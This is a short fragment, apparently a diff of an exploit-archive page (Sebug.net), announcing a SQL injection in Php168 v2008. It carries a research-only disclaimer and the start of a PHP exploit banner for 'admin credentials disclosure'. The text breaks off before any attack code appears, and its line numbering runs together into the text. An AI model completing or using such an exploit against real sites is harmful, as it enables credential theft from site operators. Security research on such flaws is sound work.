@@ -1,0 +1,6 @@
+Php168 v2008 SQL注射漏洞
+
+测试方法:
+
+@Sebug.net   dis
+本站提供程序(方法)可能带有攻击性,仅供安全研究与教学之用,风险自负!1.#!/usr/bin/php2.<?php3. 4.print_r('5.+---------------------------------------------------------------------------+6.Php168 v2008 SQL injection / admin credentials disclosure exploit7.by puret_t8.mail: puretot at gmail dot com9.team: http://www.wolv
